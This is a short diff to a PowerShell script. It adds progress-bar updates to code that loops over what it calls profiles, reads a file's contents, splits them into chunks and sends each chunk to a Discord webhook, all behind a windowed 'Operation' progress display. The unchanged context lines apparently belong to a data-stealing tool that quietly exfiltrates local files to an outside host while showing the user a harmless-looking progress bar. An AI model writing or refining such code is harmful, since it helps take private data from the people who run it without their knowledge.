@@ -155,7 +155,6 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
                     # Update progress bar value
                     $progressBar.Value = [math]::Floor(($currentProfile / $profileCount) * 100)
-
                     $textBlock.Text = "Operation 1: Profile - " + $currentProfile + "/" + $profileCount
 
                     # Update the window to keep it responsive
@@ -249,6 +248,10 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                     $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                 }
 
+                # Calculate the progress increment based on the number of chunks
+                $totalChunks = $chunks.Count
+                $progressIncrement = 100 / $totalChunks
+
                 # Send each chunk to the Discord webhook
                 foreach ($chunk in $chunks) {
                     # Create the payload for the webhook
@@ -265,6 +268,10 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                         Add-Type -AssemblyName PresentationFramework
                         [System.Windows.MessageBox]::Show("Error sending request: $_", 'Error')
                     }
+
+                    # Inside the foreach loop, after each chunk is sent
+                    $ProgressBar.Value = [math]::Min($ProgressBar.Value + $progressIncrement, 100)
+                
                 }
             } else {
                 #Write-Host "File not found: $filePath"
